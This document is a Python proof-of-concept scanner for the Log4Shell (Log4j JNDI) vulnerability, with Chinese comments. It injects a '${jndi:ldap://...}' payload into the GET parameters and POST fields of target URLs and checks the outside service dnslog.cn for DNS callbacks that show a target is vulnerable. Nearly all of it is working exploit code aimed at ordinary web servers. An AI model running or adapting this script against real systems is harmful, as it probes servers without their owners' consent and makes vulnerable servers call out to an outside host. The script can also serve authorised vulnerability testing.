#!/usr/bin/env python3
# coding=utf-8

from ast import arg
import requests
import argparse
parser = argparse.ArgumentParser()
from termcolor import cprint
from urllib import parse
import random
import time
parser.add_argument("-u", 
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l",
                    dest="urllist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("-request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("-all",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("-dns",
                    dest="dns_provider",
                    help="DNS provider: dnslog.cn",
                    action='store')

args = parser.parse_args()
post_data_parameters = ["ID", "username", "user", "name", "email", "email_address", "password", "c"]
        
Headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept': '*/*'
    }
    
class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php",
                         timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php",
                         timeout=30)
        return req.json()

# 验证log4j
def log4j_poc():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.urllist:
        with open(args.urllist, "r") as f:
            for line in f.readlines():
                line = line.strip()
                if line == "":
                    continue
                urls.append(line)
    # 开始测试...
    for url in urls:
        dns = Dnslog()
        dnsHost = dns.domain
        getPayLoad(url, dnsHost)
        if args.dns_provider:
            cprint(f"自行查看dnslog.cn结果判断", "green")
        else:
            # 获取DNS的结果
            records = dns.pull_logs()
            if len(records) > 0:
                cprint(f"[!!!] {url}:存在Log4j漏洞", "yellow")    
            else:
                cprint(f"[•] {url}:没有Log4j漏洞", "green")
        cprint("[•] ------------------------------------------------------------------------")
def getPayLoad(url, dnsHost):
    # 样例 expample.com:8080/helloword.html?payload=1
    if ('http' not in url):
        url = str("http://") + str(url)
    # scheme:http
    scheme = parse.urlparse(url).scheme 
    # dirPath = /helloword.html
    dirPath = parse.urlparse(url).path
    # host = expample.com:8080
    host = parse.urlparse(url).netloc
    # params
    queryParse = parse.urlparse(url).query.split('=')[0]
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(5))
    payload = '${jndi:ldap://%s.%s/%s}' % (host.split(':')[0], dnsHost, random_string)
    cprint(f"[•] URL:{url}", "cyan")
    cprint(f"[•] 生成的payload:{payload}", "cyan")
    cprint("[•] Payload 已发送给URL. 等到DNSlog的结果", "cyan")
    cprint("[•] 等待中...", "cyan")
    
    if args.run_all_tests:
        reqPost = {}
        for i in post_data_parameters:
            reqPost.update({i:payload})
        try:
            requests.request(url=url.split('?')[0],
                                method="GET",
                                params={queryParse:payload},
                                headers=Headers,
                                timeout=5)
            requests.request(url=url,
                        method="POST",
                        headers=Headers,
                        data=reqPost,
                        timeout=5)
        except Exception as e:
            pass
    elif args.request_type.upper() == "GET":
        try:
            requests.request(url=url.split('?')[0],
                                method="GET",
                                params={queryParse:payload},
                                headers=Headers,
                                timeout=5)
        except Exception as e:
            pass
    elif args.request_type.upper() == "POST":
        reqPost = {}
        for i in post_data_parameters:
            reqPost.update({i:payload})
        try:
            requests.request(url=url,
                    method="POST",
                    headers=Headers,
                    data=reqPost,
                    timeout=5)
        except Exception as e:
            pass

    time.sleep(5)

if __name__ == '__main__':
    # try:
    log4j_poc()
    # except:
    #     print("Exiting...")
    #     exit(0)
    